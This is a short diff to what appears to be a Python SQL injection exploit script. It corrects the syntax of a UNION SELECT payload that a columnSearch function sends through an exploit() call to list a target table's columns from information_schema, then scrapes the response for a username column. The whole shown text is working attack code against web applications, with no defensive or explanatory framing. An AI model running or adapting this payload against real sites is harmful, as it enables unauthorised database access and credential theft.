@@ -23,7 +23,7 @@ def tableSearch(url):
         return False
 
 def columnSearch(url, userTable):
-    payload = f"' union select column_name, null from information_schema.columns from table_name='{userTable}-- -"
+    payload = f"' union select column_name, null from information_schema.columns where table_name='{userTable}-- -"
     response = exploit(url, payload)
     soup = BeautifulSoup(response, 'html.parser')
     userColumn = soup.find(text=re.compile('.*username.*'))
